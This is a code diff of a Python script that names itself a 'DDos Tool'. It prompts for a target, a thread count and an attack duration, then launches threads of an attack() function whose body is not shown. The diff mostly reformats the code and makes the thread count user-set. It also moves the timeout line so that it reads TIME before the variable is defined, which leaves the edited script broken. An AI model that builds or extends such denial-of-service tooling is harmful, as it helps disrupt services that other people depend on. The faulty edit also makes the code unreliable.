@@ -1,28 +1,31 @@
-import socket, random, threading, sys, time, os
+import socket
+import random
+import threading
+import sys
+import time
+import os
+
 from os import system
 
-cmd = 'mode 50,10'
-os.system(cmd)
+system("mode 50,10")
 system("title DDos Tool @hvrl")
 running = True
 
-# USER INPUT & GUI
 def start():
-    print('GitHub @hvrrl')
+    print("GitHub @hvrrl")
     print('')
+    global TARGET
+    global THREADS
+    global TIME
     try:
-        global TARGET
-        global THREADS
-        global TIME
-        TARGET = str(input('ENTER YOUR TARGET: '))
-        THREADS = 80
-        TIME = float(input('ENTER ATTACK DURATION: '))
+        TARGET = str(input("ENTER YOUR TARGET: "))
+        THREADS = int(input("ENTER THREADS: "))
+        TIME = float(input("ENTER ATTACK DURATION: "))
     except:
-        print('Invalid Input')
-    global timeout
-    timeout = time.time() + 1*TIME
-    os.system('cls')
-
+        print("Invalid Input")
+    system("cls")
+    
+timeout = time.time() + 1*TIME
 
 def attack():
     try:
@@ -39,14 +42,13 @@ def attack():
 def main():
     while running:
         start()
-        
         for x in range(0, THREADS):
             threading.Thread(target=attack).start()
             
         time.sleep(TIME)
-        print('ATTACK DONE')
+        print("ATTACK DONE")
         time.sleep(1)
-        os.system('cls')
+        system("cls")
 
 if __name__ == '__main__':
     main()
